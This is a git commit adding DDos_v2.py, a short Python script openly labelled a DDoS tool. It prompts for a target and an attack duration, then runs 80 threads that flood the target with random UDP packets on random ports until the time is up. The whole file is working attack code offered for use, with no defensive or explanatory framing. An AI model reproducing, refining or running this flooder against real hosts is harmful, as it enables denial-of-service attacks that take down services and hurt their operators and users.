15af9277fec7979adfd6b0b73e74ecdc51cf345c
v9 <84303491+v9f@users.noreply.github.com>
2021-06-18 10:05:03 +0800

    Add files via upload

---
+++ DDos_v2.py
@@ -0,0 +1,51 @@
+import socket, random, threading, sys, time, os
+from os import system
+
+cmd = 'mode 50,10'
+os.system(cmd)
+system("title DDos Tool @LOWKEY")
+running = True
+
+#USER INPUT & GUI
+def start():
+    print('GitHub @Lowkeying')
+    print('')
+    try:
+        global TARGET
+        global THREADS
+        global TIME
+        TARGET = str(input('ENTER YOUR TARGET: '))
+        THREADS = 80
+        TIME = float(input('ENTER ATTACK DURATION: '))
+    except:
+        print('Invalid Input')
+    global timeout
+    timeout = time.time() + 1*TIME
+    os.system('cls')
+
+
+def attack():
+    try:
+        bytes = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < timeout:
+            dport = random.randint(20,55500)
+            sock.sendto(bytes*random.randint(5,15), (TARGET, dport))
+        return
+        sys.exit()
+    except:
+        pass
+    
+def main():
+    while running:
+
+        start()
+        for x in range(0, THREADS):
+            threading.Thread(target=attack).start()
+        time.sleep(TIME)
+        print('ATTACK DONE')
+        time.sleep(1)
+        os.system('cls')
+
+if __name__ == '__main__':
+    main()
